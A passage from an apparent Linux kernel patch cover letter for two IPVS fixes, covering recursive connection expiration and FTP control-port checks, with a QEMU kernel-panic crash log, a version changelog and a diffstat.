[   40.621785] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   40.621785] Workqueue: netns cleanup_net
[   40.621785] Call Trace:
[   40.951167] BUG: unable to handle page fault for address: ff11000011430ff4
[   40.951167] #PF: supervisor instruction fetch in kernel mode
[   40.951167] #PF: error_code(0x0011) - permissions violation
[   40.951167] PGD 6f1e067 P4D 6f1f067 PUD 6f20067 PMD 80000000114001e3 
[   40.951167] Thread overran stack, or stack corrupted
[   40.951167] Oops: Oops: 0011 [#1] SMP KASAN NOPTI
[   40.951167] CPU: 0 UID: 0 PID: 11 Comm: kworker/0:1 Tainted: G        W           7.3.0-rc2-g70194dc37670 #1 PREEMPT(lazy) 
[   40.951167] Tainted: [W]=WARN
[   40.951167] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   40.951167] Workqueue:  0x0 (events_freezable_pwr_efficient)
[   40.951167] Call Trace:
[   40.951167]  <TASK>
[   40.951167]  ? ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:1341 net/netfilter/ipvs/ip_vs_conn.c:1375)
[   40.951167]  ? __pfx_ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:380 (discriminator 5))
[   40.951167]  ? ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:1341 net/netfilter/ipvs/ip_vs_conn.c:1375)
[   40.951167]  ? __pfx_ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:380 (discriminator 5))
[   40.951167]  ? ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:1341 net/netfilter/ipvs/ip_vs_conn.c:1375)
[   40.951167]  ? __pfx_ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:380 (discriminator 5))
[   40.951167]  ? ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:1341 net/netfilter/ipvs/ip_vs_conn.c:1375)
[   40.951167]  ? __pfx_ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:380 (discriminator 5))
[   40.951167]  </TASK>
[   40.951167] Kernel panic - not syncing: Fatal exception
[   40.951167] Shutting down cpus with NMI
[   40.951167] Kernel Offset: disabled
[   40.951167] ---[ end Kernel panic - not syncing: Fatal exception ]---
-----END crash log-----

changes in v3:
  - Resend both fixes as one nf series, as requested by the maintainer.
  - Handle the timer-callback race while keeping controller cleanup
    iterative and synchronous.
  - Refresh the PoC and crash evidence for the nf baseline.
  - v2 Link:
    https://lore.kernel.org/all/cover.1789435989.git.zihanx@nebusec.ai/
changes in v2:
  - Use an iterative repeat path for controller cleanup.
  - Add the FTP-helper checks for configured control ports, including the
    active-mode path.
  - v1 Link:
    https://lore.kernel.org/all/cover.1789110326.git.zihanx@nebusec.ai/

Best regards,
Zihan Xi

Zihan Xi (2):
  ipvs: avoid stack overflow from recursive connection expiration
  ipvs: reject FTP control ports as data ports

 net/netfilter/ipvs/ip_vs_conn.c | 78 +++++++++++++++++++++++++--------
 net/netfilter/ipvs/ip_vs_ftp.c  | 18 ++++++++
 2 files changed, 77 insertions(+), 19 deletions(-)

-- 
2.43.0
